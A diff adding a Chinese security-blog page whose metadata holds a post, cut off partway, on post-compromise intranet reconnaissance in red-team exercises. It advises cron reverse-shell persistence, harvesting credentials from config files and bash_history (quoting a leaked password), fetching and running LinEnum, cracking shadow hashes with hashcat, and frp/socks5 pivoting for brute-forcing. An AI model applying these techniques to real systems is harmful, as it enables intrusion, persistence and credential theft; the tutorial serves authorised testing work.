@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script defer src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script defer src="/assets/js/gta.js"></script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2020/inside-internet-walk-through/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;「信息搜集」:漫谈一些在内网的信息搜集技巧&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        Bin4xin
+
+        
+            
+            &lt;!-- wrench time--&gt;
+            
+        edited
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Mar 19, 2021
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;p&gt;经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;2021年 3月19日 星期五 16时37分27秒 CST&lt;/strong&gt;更新&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;重构了部分小结的展示：
+    &lt;ul&gt;
+      &lt;li&gt;重新调整了文章的阐述框架，尽可能从实战角度出发，进行章节安排；&lt;/li&gt;
+      &lt;li&gt;尽量使得前后小结更加紧凑，阐述逻辑更加清晰。&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;加入了尽可能多的markdown语法，文章结构清晰的同时，让页面更加赏心悦目。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;写在文前：&lt;/p&gt;
+
+  &lt;p&gt;年后回来就一直在肝代码，肝的快失去信心了；正好三月中旬有场全国范围的攻防演练，就来重新拾起信心～演练结束再肝代码再失去信心，循环往复=。=&lt;/p&gt;
+
+  &lt;p&gt;本文着重从实战角度作为切入点，从获取的跳板机为入口进行阐述，基本的逻辑为：&lt;/p&gt;
+
+  &lt;p&gt;跳板机-&amp;gt;内网代理-&amp;gt;信息搜集-&amp;gt;漏洞挖掘与利用&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;我们从攻击者的角度来看，拿到一个跳板机的权限后首先是对跳板机所在的区域进行路由划分，我们可以通过这样的思路来判断获得内网中搜集到的信息是否利于我们进一步渗透，同时我们在此过程中也需要小心谨慎，攻防演练中我所遇到的基本上都是生产环境，在和开发、运维人员博弈的过程中要做到：
+&lt;strong&gt;悄悄地来、悄悄的走&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;废话不多说，文笔较菜，文章权当抛砖引玉，回到正题。&lt;/p&gt;
+&lt;h2 id=&quot;零在机器上的信息搜集&quot;&gt;零：在机器上的信息搜集&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;渗透的本质就是信息搜集&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;0x01个人工作机器信息搜集&quot;&gt;0x01：个人工作机器信息搜集&lt;/h3&gt;
+&lt;p&gt;这方面我本人了解的不是很多，一般来说是通过钓鱼邮件的形式获取的WINDOWS PC权限，可以参考我另一篇从网上的搬运过来的文章：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://juejin.cn/post/6881208971915444231#heading-3&quot;&gt;个人机器信息收集&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;0x02web服务器信息搜集&quot;&gt;0x02：WEB服务器信息搜集&lt;/h3&gt;
+&lt;p&gt;一般建议可以以root用户新建用户来维持权限，或者是写入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;corntab&lt;/code&gt;计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。&lt;/p&gt;
+&lt;h4 id=&quot;-配置文件&quot;&gt;# 配置文件&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;数据库配置信息
+通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xp_cmd_shell&lt;/code&gt;来执行命令。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在当前目录下搜索存在字符为&lt;span class=&quot;s1&quot;&gt;&#39;mysql&#39;&lt;/span&gt;的文件
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rn&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mysql&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
+查看对应系统的敏感配置文件
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;static/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php
+&lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
+curl ifconfig.me
+120.25.13.49
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-ef&lt;/span&gt;|grep java
+
+netstat &lt;span class=&quot;nt&quot;&gt;-ANTUP&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;-bash_history&quot;&gt;# bash_history&lt;/h4&gt;
+
+&lt;p&gt;命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;nexus-3.12.0-01
+ll
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;bin/
+./nexus start
+pactera@575
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;domain/
+ll
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;nexus3/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;注意&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./nexus start&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd domain/&lt;/code&gt;两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;醍醐灌顶&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&quot;-一些自动化搜集脚本&quot;&gt;# 一些自动化搜集脚本&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;LinEnum.sh
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/linenum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +X /tmp/linenum.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bash /tmp/linenum.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;-passwdshadow不推荐&quot;&gt;# Passwd&amp;amp;Shadow（不推荐）&lt;/h4&gt;
+
+&lt;p&gt;一般来说通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shiro&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;struts2&lt;/code&gt;拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，哈希不可逆，除非存在彩虹表，一般都跑不出来。&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1800 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; found.txt linux-root.txt /usr/share/john/password.lst &lt;span class=&quot;nt&quot;&gt;--force&lt;/span&gt;
+hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v4.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...
+
+OpenCL Platform &lt;span class=&quot;c&quot;&gt;#1: The pocl project&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: pthread-Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz, 256/738 MB allocatable, 1MCU&lt;/span&gt;
+
+Hashes: 2 digests&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Zero-Byte
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Uses-64-Bit
+
+Password length minimum: 0
+Password length maximum: 256
+
+ATTENTION! Pure &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unoptimized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; OpenCL kernels selected.
+This enables cracking passwords and salts &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; length 32 but &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the price of drastical reduced performance.
+If you want to switch to optimized OpenCL kernels, append &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+Watchdog: Temperature retain trigger disabled.
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: build_opts &#39;-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll&#39;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: Kernel m01800.8f866878.kernel not found in cache! Building may take a while...&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;继续 :(&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r]esume &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; Dictionary cache built:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: /usr/share/john/password.lst
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 3559
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 26325
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 3559
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Runtime...: 0 secs
+
+- Device &lt;span class=&quot;c&quot;&gt;#1: autotuned kernel-accel to 128&lt;/span&gt;
+- Device &lt;span class=&quot;c&quot;&gt;#1: autotuned kernel-loops to 128&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r]esume &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoint &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q]uit &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;s]tatus &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;p]ause &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;r]esume &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;b]ypass &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;c]heckpoApproaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: sha512crypt &lt;span class=&quot;nv&quot;&gt;$6$,&lt;/span&gt; SHA512 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Hash.Target......: linux-root.txt
+Time.Started.....: Mon Jun  8 11:29:25 2020 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;23 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Time.Estimated...: Mon Jun  8 11:29:48 2020 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0 secs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Guess.Base.......: File &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/usr/share/john/password.lst&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Guess.Queue......: 1/1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Speed.Dev.#1.....:      311 H/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.82ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Recovered........: 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Digests, 0/2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Salts
+Progress.........: 7118/7118 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Rejected.........: 0/7118 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Restore.Point....: 3559/3559 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100.00%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Candidates.#1....: doom2 -&amp;gt; sss
+HWMon.Dev.#1.....: N/A
+
+Started: Mon Jun  8 11:28:50 2020
+Stopped: Mon Jun  8 11:29:49 2020
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03运维机器信息搜集&quot;&gt;0x03：运维机器信息搜集&lt;/h3&gt;
+
+&lt;p&gt;头脑风暴中…（没有遇到，有再更新）&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;密码复用&lt;/li&gt;
+  &lt;li&gt;常见运维平台及服务的漏洞利用
+    &lt;ul&gt;
+      &lt;li&gt;zabbix agent&lt;/li&gt;
+      &lt;li&gt;堡垒机&lt;/li&gt;
+      &lt;li&gt;…&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;一局域网里的信息搜集&quot;&gt;一：局域网里的信息搜集&lt;/h2&gt;
+
+&lt;h3 id=&quot;1x01跳板机攻击&quot;&gt;1x01：跳板机攻击&lt;/h3&gt;
+&lt;p&gt;这一小节提出的意思是：跳板机上的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;公网暴露&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;内网暴露&lt;/code&gt;。
+如：&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;各种数据库 mysql、oracle、postgresql仅内网开放&lt;/li&gt;
+  &lt;li&gt;区别在于：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bind addr&lt;/code&gt; = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0.0.0.0 or 127.0.0.1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;inside_ip_addr&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+20893/tcp open  textui       Alibaba Dubbo remoting telnetd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;显而易见，内网里的Dubbo，反序列化走一波。&lt;/p&gt;
+
+&lt;h3 id=&quot;1x02内网代理&quot;&gt;1x02：内网代理&lt;/h3&gt;
+
+&lt;p&gt;内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。&lt;/p&gt;
+
+&lt;p&gt;极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。下面顺便贴上server端和client端的配置文件:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;frp server:&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;frp/frps.ini 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;common]
+&lt;span class=&quot;c&quot;&gt;# vps代理TCP监听端口&lt;/span&gt;
+bind_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 7000
+
+&lt;span class=&quot;c&quot;&gt;# 授权码，请改成更复杂的&lt;/span&gt;
+token &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your token&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# frp管理后台端口，请按自己需求更改&lt;/span&gt;
+dashboard_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 7500
+&lt;span class=&quot;c&quot;&gt;# frp管理后台用户名和密码，请改成自己的&lt;/span&gt;
+dashboard_user &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your admin username&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+dashboard_pwd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your admin password&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+enable_prometheus &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# frp日志配置&lt;/span&gt;
+log_file &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /var/log/frps.log
+log_level &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; info
+log_max_days &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 3
+
+&lt;span class=&quot;c&quot;&gt;#启动vps frps端&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./frps &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; frps.ini
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;frp clients（被代理客户端，可以称为跳板机）:&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;s5_jsccs.ini 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;common]
+server_addr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your vps ip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+server_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 7000
+&lt;span class=&quot;nv&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your token&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#此处可以自定义标签-dashboard面板proxies父栏对应的name={target}，{target}示例：s5_in_JStelecom&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;target&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; tcp
+remote_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10010
+plugin &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; socks5
+plugin_user &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your connect username&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+plugin_passwd &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your connect password&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+use_encryption &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;use_compression &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;client（代理进内网客户端，可以称为攻击机器）&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;1.proxifier（支持mac、windows）配置自定义：
+        &lt;ul&gt;
+          &lt;li&gt;server_addr = {your vps ip}&lt;/li&gt;
+          &lt;li&gt;server_port = 7000&lt;/li&gt;
+          &lt;li&gt;plugin = socks5&lt;/li&gt;
+          &lt;li&gt;plugin_user = {your connect username}&lt;/li&gt;
+          &lt;li&gt;plugin_passwd = {your connect password}&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;2.proxychains4 (linux、mac)配置&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;文件：
+        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ProxyList]
+  &lt;span class=&quot;c&quot;&gt;# add proxy here ...&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# meanwile&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# defaults set to &quot;tor&quot;&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# socks4        127.0.0.1 9050&lt;/span&gt;
+
+  &lt;span class=&quot;c&quot;&gt;#socks5 127.0.0.1 1081&lt;/span&gt;
+  socks5  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your vps ip&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your vps port&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your connect username&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;your connect password&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# burp suite proxy&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#http 127.0.0.1 12344&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;应用即可。&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxychains4 curl http://{target.ip}:{target.port}/&lt;/code&gt;命令进行内网访问，一般可以通过命令行进行海德拉批量口令爆破，若需GUI进行浏览器访问可使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proxifier&lt;/code&gt;进行全局代理进行web访问。&lt;/p&gt;
+
+&lt;h3 id=&quot;1x03内网穿透&quot;&gt;1x03：内网穿透&lt;/h3&gt;
+
+&lt;p&gt;在写之前我们需要明确一点，就是我们所需要的内网目标是什么？
+而内网穿透和内网代理的分别在哪里？
+在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？&lt;/p&gt;
+
